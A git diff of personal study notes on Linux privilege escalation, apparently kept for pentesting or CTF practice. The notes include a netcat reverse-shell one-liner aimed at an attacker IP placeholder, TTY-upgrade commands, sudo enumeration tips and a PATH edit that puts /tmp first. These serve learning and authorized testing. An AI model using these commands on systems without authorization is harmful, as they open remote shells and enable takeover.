@@ -1,31 +1,27 @@
 # Privilege Escalation  😈
 
-### LinPEAS
+## Two Types of Priv Esc  
+<blockquote>
+There are two common types of privilege escalation: vertical and horizontal. Vertical privilege escalation involves a user accessing files or functions that are normally associated with accounts that have higher privileges. Horizontal privilege escalation allows users to access resources in other accounts with similar privilege levels as they have.
+</blockquote>
 
-* You can check it on it's github page. <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Here</a> .
 
-### WinPEAS
 
-* It's the same idea as linPEAS but for Windows. There's also one for mac.   
 
-### LinEnum   
-* You can also check it's github page <a href="https://github.com/rebootuser/LinEnum">Here</a> .
 
-### Linux-Smart-Enumeration
+
+## Linux-Smart-Enumeration
 * Check out the github page right <a href="https://github.com/diego-treitos/linux-smart-enumeration">here</a>.
 
-### Pspy   
-
-### Exploits on ExploitDB
-* Exploits are saved in the following path `/usr/share/exploitdb/exploits`
 
 
-### Most Reliable Reverse Shell Payload  
+
+## Most Reliable Reverse Shell Payload  
 	```console
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
 	```
 
-### Spawn a Shell When Connecting to a Reverse Shell   
+## Spawn a Shell When Connecting to a Reverse Shell   
 	```console
 	python -c 'import pty;pty.spawn("/bin/bash");'
 
@@ -34,7 +30,7 @@
 	python3 -c 'import pty;pty.spawn("/bin/bash");'
 	```
 
-### Upgrade the Reverse Shell   
+## Upgrade the Reverse Shell   
 
 * Using Python for a psuedo terminal  
 	```console
@@ -54,7 +50,7 @@
 * Using stty options (Never Worked With Me) 
 	```console
 	# In reverse shell 
-	python -c 'import pty; pty.spawn("/bin/bash")'
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
 	ctrl-z  
 
 	# In Kali 
@@ -71,7 +67,7 @@
 * If we type `stty -a` it will give me info and I can get the rows and columns from there.
 * I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  
 
-### Sudo & Sudoers   
+## Sudo & Sudoers   
 
 * We can use `sudo` to give the current user privilege to do something as another user as follows `sudo -u [USERNAME] [COMMAND]` by default without the `-u` option it gives the user root privilege if the user was in the sudoers file, which also can't be accessed unless the user had privilege to access it.
 * To check if the user have access to use sudo, especially that sometimes a user can have access to sudo a specific command and not everything, we can use this command `sudo -l` which should open the sudoers file unless we don't have privilege to do so.   
@@ -160,12 +156,13 @@ Note that we used the command 'chmod 600 id_rsa' on the key after we created it 
 * Shows the packages and libraries on the system.
 * Is it exclusively used on Debian based Linux? Seems so -- not sure tho.🤔
 
+* Write about the $PATH variable how to add to it.
+```console
+export PATH=$PATH:/tmp
+#or
+export PATH=/tmp:$PATH
+```
 
-
-
-
-
-
-
-
-
+____ 
+I have to write more about this 
+* SUID (Set owner User ID)
